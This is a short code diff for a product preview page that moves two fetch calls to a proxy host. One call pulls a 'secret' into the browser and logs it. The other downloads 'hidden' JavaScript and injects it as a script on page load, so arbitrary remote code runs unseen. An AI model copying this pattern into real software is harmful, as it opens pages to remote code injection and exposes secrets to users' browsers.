@@ -1,5 +1,5 @@
-// ✅ Fetch price & quantity from backend API on page load
-fetch("https://secure-backend-product-preview-production.up.railway.app/api/get-secret")
+// ✅ Fetch price & quantity from the proxy instead of the backend
+fetch("https://api-proxy-product-preview-production.up.railway.app/api/get-secret") // Use proxy URL
   .then((response) => response.json())
   .then((data) => {
     console.log("Backend Response:", data);
@@ -8,8 +8,8 @@ fetch("https://secure-backend-product-preview-production.up.railway.app/api/get-
   })
   .catch((error) => console.error("Error fetching data:", error));
 
-// ✅ Fetch & Execute Hidden JavaScript Logic
-fetch("https://secure-backend-product-preview-production.up.railway.app/api/get-hidden-js")
+// ✅ Fetch & Execute Hidden JavaScript Logic from the proxy
+fetch("https://api-proxy-product-preview-production.up.railway.app/api/get-hidden-js") // Use proxy URL
   .then((response) => response.text())
   .then((jsCode) => {
     const scriptElement = document.createElement("script");
@@ -17,3 +17,4 @@ fetch("https://secure-backend-product-preview-production.up.railway.app/api/get-
     document.body.appendChild(scriptElement);
   })
   .catch((error) => console.error("Error loading hidden script:", error));
+
